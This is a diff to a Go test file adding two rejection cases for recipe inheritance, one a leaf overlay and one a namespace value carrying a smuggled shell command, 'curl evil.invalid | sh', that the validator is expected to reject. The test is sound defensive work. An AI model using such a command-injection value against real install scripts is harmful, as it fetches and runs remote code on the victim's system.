@@ -2893,6 +2893,23 @@ func TestResolveRecipe_InheritFromRejects(t *testing.T) {
 	// success.
 	noComponents := priorRecipe(t, filepath.Join(dir, "no-components.yaml"), nil)
 
+	// A leaf overlay. LoadRecipe auto-hydrates this kind against the current
+	// data provider, so without the guard it would resolve successfully and
+	// hand back the registry namespaces inheritance exists to override.
+	overlay := filepath.Join(dir, "overlay.yaml")
+	if err := os.WriteFile(overlay, []byte(
+		"kind: RecipeMetadata\napiVersion: aicr.run/v1alpha2\nmetadata:\n  name: leaf\n"+
+			"spec:\n  criteria:\n    service: eks\n    accelerator: h100\n    intent: training\n",
+	), 0o600); err != nil {
+		t.Fatalf("setup: write overlay: %v", err)
+	}
+
+	// The namespace reaches a generated install script through an unquoted
+	// template interpolation, so a value carrying shell metacharacters must not
+	// survive to assignment.
+	injected := priorRecipe(t, filepath.Join(dir, "injected.yaml"),
+		map[string]string{"gpu-operator": "gpu-operator; curl evil.invalid | sh"})
+
 	tests := []struct {
 		name        string
 		inheritFrom string
@@ -2905,6 +2922,8 @@ func TestResolveRecipe_InheritFromRejects(t *testing.T) {
 		// component list, so this is the one rejected shape that reaches the
 		// inheritance step rather than failing before it.
 		{"recipe with no componentRefs", noComponents, "carries no components to inherit namespaces from"},
+		{"leaf overlay is not a resolved recipe", overlay, "it must be a resolved RecipeResult"},
+		{"namespace carrying shell metacharacters", injected, "is not a valid Kubernetes namespace"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
